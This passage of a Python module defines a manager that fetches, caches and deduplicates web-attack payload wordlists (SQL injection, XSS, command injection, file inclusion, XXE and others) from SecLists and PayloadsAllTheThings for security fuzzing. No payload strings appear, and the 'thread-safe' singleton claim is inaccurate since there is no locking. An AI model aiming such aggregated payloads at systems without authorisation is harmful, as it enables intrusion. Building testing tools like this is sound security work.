            self._log(f"Using fallback payloads for {path} ({len(fallback)} payloads)")
            self._memory_cache[path] = fallback
            return fallback

        self._log(f"No payloads available for: {path}")
        return []

    def _infer_category(self, path: str) -> Optional[str]:
        """Infer payload category from path string."""
        path_lower = path.lower()
        if "sqli" in path_lower or "sql" in path_lower or "mysql" in path_lower:
            return "sqli"
        if "xss" in path_lower:
            return "xss"
        if "lfi" in path_lower or "path" in path_lower or "traversal" in path_lower or "file_inclusion" in path_lower or "file inclusion" in path_lower:
            return "lfi"
        if "command" in path_lower or "rce" in path_lower or "cmdi" in path_lower:
            return "cmdi"
        if "ssti" in path_lower or "template" in path_lower:
            return "ssti"
        if "ssrf" in path_lower:
            return "ssrf"
        if "nosql" in path_lower or "mongodb" in path_lower:
            return "nosqli"
        if "ldap" in path_lower:
            return "ldap"
        if "xxe" in path_lower or "xml" in path_lower:
            return "xxe"
        if "redirect" in path_lower:
            return "redirect"
        if "crlf" in path_lower:
            return "crlf"
        return None

    def get_by_category(self, category: str) -> List[str]:
        """
        Get all payloads for a given vulnerability category.

        Fetches from all known sources for that category and deduplicates.

        Args:
            category: One of "sqli", "xss", "cmdi", "ssti", "lfi", "ssrf", "nosqli"

        Returns:
            Deduplicated list of payloads
        """
        all_payloads: Set[str] = set()

        # Map category to known wordlist keys from DIRECT_URL_CATALOG
        # Using catalog keys avoids duplicate fetches that happen when the same
        # file is referenced both by its SecLists path and a catalog alias.
        category_sources: Dict[str, List[str]] = {
            "sqli": [
                # SecLists
                "sqli_generic",
                "sqli_quick",
                "sqli_auth_bypass_seclists",
                "sqli_polyglots",
                "sqli_mysql_fuzzdb",
                "sqli_mysql_login_bypass",
                "sqli_mssql",
                "sqli_oracle",
                "sqli_nosql",
                "sqli_blind",
                # PayloadsAllTheThings
                "patt_sqli_auth_bypass",
                "patt_sqli_auth_bypass2",
                "patt_sqli_fuzzdb_mssql_time",
                "patt_sqli_fuzzdb_mssql",
                "patt_sqli_fuzzdb_mssql_enum",
                "patt_sqli_fuzzdb_mysql",
                "patt_sqli_fuzzdb_mysql_time",
                "patt_sqli_fuzzdb_mysql_read",
                "patt_sqli_fuzzdb_oracle",
                "patt_sqli_fuzzdb_postgres",
                "patt_sqli_error_based",
                "patt_sqli_fuzz",
                "patt_sqli_time_based",
                "patt_sqli_union_select",
                "patt_sqli_polyglots",
            ],
            "xss": [
                # SecLists
                "xss_brutelogic",
                "xss_portswigger",
                "xss_jhaddix",
                "xss_rsnake",
                "xss_with_context",
                "xss_somdev",
                "xss_payloadbox",
                "xss_ofjaaah",
                "xss_polyglots",
                "xss_polyglot_0xsobky",
                # PayloadsAllTheThings
                "patt_xss_event_handlers",
                "patt_xss_brutelogic_js",
                "patt_xss_brutelogic_strings",
                "patt_xss_intruders",
                "patt_xss_jhaddix",
                "patt_xss_mario",
                "patt_xss_rsnake",
                "patt_xss_detection",
                "patt_xss_polyglots",
                "patt_xss_jsonp",
                "patt_xss_portswigger_events",
                "patt_xss_alert",
                "patt_xss_alert_identifiable",
                "patt_xss_quick",
                "patt_xss_swf",
            ],
            "cmdi": [
                # SecLists
                "cmdi_commix",
                # PayloadsAllTheThings
                "patt_cmdi_unix",
                "patt_cmdi_exec",
            ],
            "ssti": [
                "ssti_payloads",
            ],
            "lfi": [
                # SecLists
                "lfi_jhaddix",
                "lfi_linux",
                "lfi_windows",
                "lfi_linux_packages",
                # PayloadsAllTheThings — Directory Traversal
                "patt_traversal_deep",
                "patt_traversal_basic",
                "patt_traversal_dotdotpwn",
                "patt_traversal_exotic",
                # PayloadsAllTheThings — File Inclusion
                "patt_lfi_bsd",
                "patt_lfi_jhaddix",
                "patt_lfi_fd_check",
                "patt_lfi_windows_check",
                "patt_lfi_linux",
                "patt_lfi_files_list",
                "patt_lfi_files_null",
                "patt_lfi_mac",
                "patt_lfi_traversal",
                "patt_lfi_web",
                "patt_lfi_windows",
                "patt_lfi_dotslash",
                "patt_lfi_php_filter",
                "patt_lfi_simple",
            ],
            "ssrf": [
                # No dedicated Intruder files in PATT; fallback payloads only
            ],
            "nosqli": [
                "nosqli_seclists",
                # PayloadsAllTheThings
                "patt_nosqli_mongodb",
                "patt_nosqli_nosql",
            ],
            "ldap": [
                "patt_ldap_fuzz",
                "patt_ldap_fuzz_small",
                "patt_ldap_attributes",
            ],
            "xxe": [
                "patt_xxe_fuzzing",
                "patt_xxe_attacks",
            ],
            "redirect": [
                "patt_redirect_payloads",
                "patt_redirect_wordlist",
                "patt_redirect_openredirects",
            ],
            "crlf": [
                "patt_crlf",
            ],
        }

        sources = category_sources.get(category, [])
        for source in sources:
            payloads = self.get_wordlist(source)
            all_payloads.update(payloads)

        # Always include fallback payloads for coverage
        if category in FALLBACK_PAYLOADS:
            all_payloads.update(FALLBACK_PAYLOADS[category])

        result = list(all_payloads)
        self._log(f"Category '{category}': {len(result)} unique payloads from {len(sources)} sources")
        return result

    def get_all_injection_payloads(self) -> Dict[str, List[str]]:
        """
        Fetch ALL injection payload categories at once.

        Returns:
            Dict mapping category name to list of payloads
        """
        categories = ["sqli", "xss", "cmdi", "ssti", "lfi", "ssrf", "nosqli",
                      "ldap", "xxe", "redirect", "crlf"]
        result = {}
        for cat in categories:
            result[cat] = self.get_by_category(cat)
        return result

    def get_stats(self) -> Dict[str, int]:
        """Return fetch statistics."""
        return dict(self._stats)

    def clear_cache(self) -> None:
        """Clear all cached wordlists."""
        import shutil
        if self.cache_dir.exists():
            shutil.rmtree(self.cache_dir)
            self.cache_dir.mkdir(parents=True, exist_ok=True)
        self._memory_cache.clear()
        self._log("Cache cleared")


# =============================================================================
# MODULE-LEVEL SINGLETON
# =============================================================================

_manager_instance: Optional[SecListsManager] = None


def get_manager(
    cache_dir: Optional[Path] = None,
    verbose: bool = True,
) -> SecListsManager:
    """
    Get or create the global SecListsManager instance.

    Thread-safe singleton pattern.
    """
    global _manager_instance
    if _manager_instance is None:
        _manager_instance = SecListsManager(
            cache_dir=cache_dir,
            verbose=verbose,
        )
    return _manager_instance


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    "SecListsManager",
    "get_manager",
    "FALLBACK_PAYLOADS",
    "DIRECT_URL_CATALOG",
    "WORDLIST_CATALOG",
]
